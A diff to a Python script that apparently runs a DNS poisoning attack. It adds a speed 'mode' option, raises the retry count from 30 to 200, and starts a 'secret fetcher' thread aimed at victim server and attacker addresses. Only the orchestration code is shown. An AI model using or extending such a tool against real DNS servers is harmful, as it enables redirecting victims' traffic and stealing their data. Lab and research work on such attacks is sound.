@@ -123,8 +123,10 @@ def secret_fetcher(server_ip, server_port):
 #       A function responsible for creating and initializating DNSAttack class       
 #
 def launch_attack(victim_server_ip, domain, bad_server_data, attacker_ip, bad_domain,\
-         ns_server_ip=None, number_of_tries=None, victim_mac=None, nic_interface=None, attack_type=None):
+         ns_server_ip=None, number_of_tries=None, victim_mac=None, nic_interface=None,\
+                  attack_type=None, mode=DNSAttack.Mode.NORMAL):
 
+        # Create the attack instance
         attack = DNSAttack(victim_server_ip, domain, bad_server_data,\
                  attacker_ip, bad_domain=bad_domain, victim_mac=victim_mac,\
                           nic_interface=nic_interface, ns_server_ip=ns_server_ip,\
@@ -133,7 +135,8 @@ def launch_attack(victim_server_ip, domain, bad_server_data, attacker_ip, bad_do
         if number_of_tries == None:
                 number_of_tries=50
 
-        attack.start(number_of_tries, mode=DNSAttack.Mode.FAST, attack_type=attack_type) 
+        # Start the attack
+        attack.start(number_of_tries, mode=mode, attack_type=attack_type) 
 
 
 ##
@@ -295,6 +298,8 @@ def main(*args):
 
         ns_server_ip = param['ns_server']
 
+        mode = param['mode']
+
 
         #Launch the secret fetcher
         secret_thread = Thread(target=secret_fetcher, args = (secret_ip, secret_port), daemon=True)
@@ -302,8 +307,8 @@ def main(*args):
 
         try:
 
-                launch_attack(victim_server_ip, domain, bad_server, attacker_ip , bad_domain, ns_server_ip, number_of_tries=30,\
-                         victim_mac=victim_mac, attack_type=attack_type, nic_interface=nic_interface)
+                launch_attack(victim_server_ip, domain, bad_server, attacker_ip , bad_domain, ns_server_ip, number_of_tries=200,\
+                         victim_mac=victim_mac, attack_type=attack_type, nic_interface=nic_interface, mode=mode)
 
         except DNSAttack.CriticalError:
                 log("\n{t.red}{t.bold}Critical Error occurred{t.normal}!!!\nTerminating")
